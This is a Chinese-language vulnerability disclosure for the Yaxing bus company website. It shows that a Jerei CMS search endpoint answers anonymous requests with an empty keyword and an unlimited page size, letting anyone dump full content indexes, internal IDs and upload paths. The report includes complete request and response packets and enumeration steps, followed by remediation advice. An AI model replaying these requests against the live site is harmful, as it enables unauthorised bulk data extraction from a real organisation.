# 雅星公交网站存在未授权信息泄露漏洞

**漏洞名称：** 雅星公交网站存在未授权信息泄露漏洞

**漏洞等级：** 中危

**漏洞类型：** 未授权访问 / 信息泄露

**漏洞URL：**

`https://www.yaxingbus.com/core/control/wcm_common_website/control.jsp`

## 详细描述

Jerei CMS 的内容检索接口不需要任何 Cookie、Token 或签名即可访问。`keywords` 传空值时返回整类内容，`pageSize` 没有上限，单个匿名请求可以导出某一类的全部内容索引。

实测 `type=news/product/video/channel` 分别返回 103、47、30、37 条，共 217 条记录。返回数据包含内部主键 `uuid`、`sid`、`cat_id` 以及 `/upload/...` 下的真实文件存储路径。

## 复现步骤

前置条件：不需要账号，不需要 Cookie。

### 第 1 步：匿名请求新闻类全量内容

完整请求包：

```http
GET /core/control/wcm_common_website/control.jsp?method=search&keywords=&cat=&model=&slow=&version=&nowPage=1&pageSize=103&type=news HTTP/1.1
Host: www.yaxingbus.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0
Referer: https://www.yaxingbus.com/site/search.htm
Connection: close
```

响应包：

```http
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 52043

{"all":103,"total":103,"time":"0.00","list":[{"img":"/upload/images/2026-10-19/5418bc0d1f5840e9a250da34c010d16.jpg","_version_":"1","cat_id":"231","title":"月圆迎佳节 聚力共前行——亚星客车举办节日活动向潍柴成立80周年献礼","type":"news","uuid":"b0faf14f-49ec-4387-a27c-b011e4356284","content":"…","url":"https://mp.weixin.qq.com/s/jJhlFZR3sQ8DfEqo_Wl3HQ","sid":"488"},......（其余 102 条省略）......]}
```

响应体为 52,043 字节，单个匿名请求即可取回新闻类全部 103 条记录。

### 第 2 步：切换内容类型，确认可枚举整站

保持同一路径，只修改 `type`：

```text
type=news    → total=103
type=product → total=47
type=video   → total=30
type=channel → total=37
```

四类合计 217 条真实记录，均不需要登录。

### 第 3 步：确认 pageSize 没有上限

将 `pageSize` 分别改为 `103`、`200`、`1000`，请求同一路径：

```text
pageSize=103  → 200，52043 字节
pageSize=200  → 200，52043 字节
pageSize=1000 → 200，52043 字节
```

响应大小一致，说明服务端没有限制单页条数，一页即可取完某一类数据。

## 影响范围

匿名用户可以批量导出网站内容索引，并获取内部对象 ID 和真实上传文件路径，为后续文件抓取或参数枚举提供基础。

## 修复方案

1. 检索接口增加鉴权或访问频率限制。
2. 空 `keywords` 不允许返回全量数据，`pageSize` 设置最大值。
3. 响应中移除 `uuid`、`sid`、`cat_id` 等内部字段，上传目录增加访问控制。
